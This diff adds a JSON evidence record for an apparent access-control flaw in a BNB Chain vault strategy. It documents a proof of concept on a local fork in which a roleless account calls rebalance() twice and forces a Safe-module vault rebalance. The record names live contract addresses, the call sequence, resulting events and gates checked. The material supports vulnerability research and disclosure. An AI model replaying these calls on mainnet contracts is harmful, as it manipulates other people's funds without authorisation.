@@ -1,0 +1,36 @@
+{
+  "note": "Local anvil fork of BSC (no mainnet transactions; fork only). Fork block 127508853 (start), fork RPC: keyless public/DRPC (URL not stored).",
+  "poc": "unprivileged EOA triggers a full vault rebalance through the Bril Safe module path",
+  "strategy": "0x430ac9648ABDc966aB95E86A93e399A8ad4d5313 (type 5, pancake-regular-v4-4)",
+  "vault": "0x2f0B78D0CaF03A81FEDe970909c6F6bb35dcA5Eb (ynBNB/WBNB, ~$277.57)",
+  "safe": "0x05cC3CA6E768a68A7f86b09e3ceE754437bd5f12 (Gnosis Safe v1.3.0, 3-of-8)",
+  "attacker": "0xf39Fd6e51aad88F6F4ce6aB8827279cffFb92266 (fresh EOA on the fork, no roles)",
+  "steps": [
+    {"call": "rebalance()", "role": "initiate", "result": "status 1 (success)", "state": "strategy.rebalanceInitiation := block.timestamp (1791944707)"},
+    {"call": "evm_increaseTime(+300s) then rebalance()", "role": "execute", "tx": "0xaef4c2bbcc2f49287db392f06ae51157dcfd38f1e090e960eb7906b08cdd2f1c", "result": "status 1 (success), gasUsed 737850, 22 logs", "evidence": [
+      "Safe event 0xb648d364... = ExecutionFromModuleSuccess(module=0x430ac964...) from 0x05cC3CA6...",
+      "3x UniV3 pool Burn events from pool 0x24f7503E6D4BaBB8acC874258eB1CdA71bC05c41",
+      "ERC20 Transfers (ynBNB 0x304b5845..., WBNB 0xbb4cdb9c...) = fee distribution to ICHI feeRecipient/affiliate",
+      "vault ranges changed to the strategy's simulate() plan: base [-887270, 887270] -> [150, 887270]; limit [240, 887270] -> [50, 150]",
+      "strategy.rebalanceInitiation reset to 0; strategy.lastRebalance := 1791945354",
+      "vault getTotalAmounts unchanged apart from tiny fee distribution (no swap: swapQuantity=0)"
+    ]},
+    {"call": "rebalance() again", "role": "throttle check", "result": "revert 'too soon' (minTimeBetweenRebalances = 10800s)"}
+  ],
+  "gates_verified": {
+    "vault.rebalance direct from attacker": "revert 'Ownable: caller is not the owner'",
+    "strategy.pause/unpause/resetStrategy/transferOwnership from attacker": "revert 'Ownable: caller is not the owner'",
+    "strategy must be an enabled Safe module for execution": "revert GS104 if not (e.g. 0xBcB0DAf8... on the $23k vault)",
+    "executable value bound (module-enabled AND ready strategies)": "8 strategies, vaults worth $419.79 total"
+  },
+  "ci": {
+    "github_runs": [
+      "https://github.com/artsbykriss/ca-zombie-ci/actions/runs/38488943822 (stale code: empty BSC_RPC_URL -> failed)",
+      "https://github.com/artsbykriss/ca-zombie-ci/actions/runs/38494293996 (stale code: pinned pruned block -> failed)",
+      "https://github.com/artsbykriss/ca-zombie-ci/actions/runs/38496563057 (foundry-toolchain HTTP 500)",
+      "https://github.com/artsbykriss/ca-zombie-ci/actions/runs/38496969691 (artifact download blocked by network)"
+    ],
+    "ready_scan_ci": "ci-out/ready-scan.json (block 127504422: 77 strategies, 19 ready) - consistent across 4 independent scans",
+    "status": "fork suite re-run pending; local anvil fork evidence recorded above"
+  }
+}
